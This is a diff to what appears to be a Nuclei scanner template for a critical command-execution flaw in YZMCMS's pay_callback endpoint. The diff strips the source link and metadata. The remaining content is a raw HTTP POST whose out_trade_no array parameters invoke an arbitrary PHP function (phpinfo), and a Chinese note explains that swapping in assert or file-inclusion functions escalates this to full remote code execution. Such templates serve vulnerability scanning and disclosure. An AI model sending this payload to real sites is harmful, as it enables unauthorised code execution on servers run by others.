@@ -3,13 +3,8 @@ info:
   name: yzmcms-pay_callback-命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hgrd63z0la9gzrqq
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hgrd63z0la9gzrqq
 http:
 - raw:
   - 'POST /pay/index/pay_callback.html HTTP/1.1
@@ -24,8 +19,6 @@ http:
 
 
     out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
-
-
 
 
     说明：out_trade_no[2]处接函数名。out_trade_no[1]处接参数值。rce需尝试assert函数或其他文件包含函数自行研究。补天提交证明代码执行即可。'
